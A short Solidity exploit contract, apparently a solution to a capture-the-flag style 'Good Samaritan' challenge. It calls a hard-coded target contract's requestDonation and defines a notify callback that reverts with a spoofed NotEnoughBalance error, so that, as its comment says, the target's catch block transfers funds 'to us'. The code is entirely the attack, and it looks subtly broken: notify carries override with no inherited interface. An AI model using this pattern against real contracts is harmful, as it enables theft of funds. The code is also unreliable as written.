pragma solidity ^0.8;

interface GoodSamaritan {
    function requestDonation() external returns (bool);
}

contract expl {
    error NotEnoughBalance();

    GoodSamaritan gs = GoodSamaritan(0x38Cc52D7aDfD94b6c8920D950eBc767FD7a6a5b2);

                // this will trigger the catch block and 
                // transfer to us
    function notify(uint256 amount) public pure override {
        if (amount <= 10) revert NotEnoughBalance(); 
    }
    function pwn() public {
        gs.requestDonation();
    }
}
